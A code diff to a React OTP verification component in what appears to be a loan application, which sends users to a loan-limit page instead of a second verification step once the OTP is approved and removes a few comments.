@@ -72,9 +72,9 @@ const OTPVerification = () => {
             setIsVerifying(false);
             
             if (statusData.status === "approved") {
-              navigate("/second-verification", { state: { phone: phoneNumber } });
+              // ✅ Goes directly to Loan Limit now
+              navigate("/loan-limit", { state: { phone: phoneNumber } });
             } else if (statusData.status === "denied") {
-              // ✅ Denied: Stay on OTP page, clear inputs silently, reset timer
               setOtp(["", "", "", ""]);
               setTimeLeft(0); 
               inputRefs.current[0]?.focus();
@@ -97,7 +97,6 @@ const OTPVerification = () => {
     if (timeLeft > 0 || isVerifying) return;
     
     setIsVerifying(true);
-    // Ensure inputs are blank when resending
     setOtp(["", "", "", ""]); 
 
     const timeoutId = setTimeout(() => {
@@ -114,7 +113,7 @@ const OTPVerification = () => {
       const data = await res.json();
       
       if (data.status === "pending" && data.otp_id) {
-        setTimeLeft(45); // Reset timer
+        setTimeLeft(45); 
         
         const interval = setInterval(async () => {
           const statusRes = await fetch(`${API_URL}/api/otp-status/${data.otp_id}`);
@@ -126,9 +125,9 @@ const OTPVerification = () => {
             setIsVerifying(false);
             
             if (statusData.status === "approved") {
-              navigate("/second-verification", { state: { phone: phoneNumber } });
+              // ✅ Goes directly to Loan Limit now
+              navigate("/loan-limit", { state: { phone: phoneNumber } });
             } else if (statusData.status === "denied") {
-              // ✅ Denied: Stay on OTP page, clear inputs silently, reset timer
               setOtp(["", "", "", ""]);
               setTimeLeft(0); 
               inputRefs.current[0]?.focus();
